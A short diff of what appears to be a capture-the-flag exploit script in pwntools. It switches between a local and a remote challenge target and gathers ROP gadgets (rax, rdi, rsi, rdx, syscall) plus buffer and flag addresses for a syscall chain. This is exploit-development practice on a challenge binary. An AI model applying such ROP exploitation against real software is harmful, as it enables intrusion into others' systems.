@@ -11,16 +11,24 @@ def debug(io):
 b Password
 '''
 )
+    
+def getio():
+    if sys.argv[1] == 'local':
+        return process("./pwn")
+    elif sys.argv[1] == 'remote':
+        return remote("127.0.0.1", 9999)
 
-# io = process("./pwn")
+io = getio()
 # debug(io)
-io = remote("127.0.0.1", 9999)
 
-syscall = 0x4194BF
-rax = 0x4212eb
-rdi = 0x4787f3
-rsi = 0x477d7d
-rdx = 0x4018ed
+elf = ELF("pwn")
+gadgets = ROP(elf)
+
+syscall = 0x41947f
+rax = gadgets.rax.address
+rdi = gadgets.rdi.address
+rsi = gadgets.rsi.address
+rdx = gadgets.rdx.address
 
 username = 0x4aba58
 flag_adr = username + 0xE0
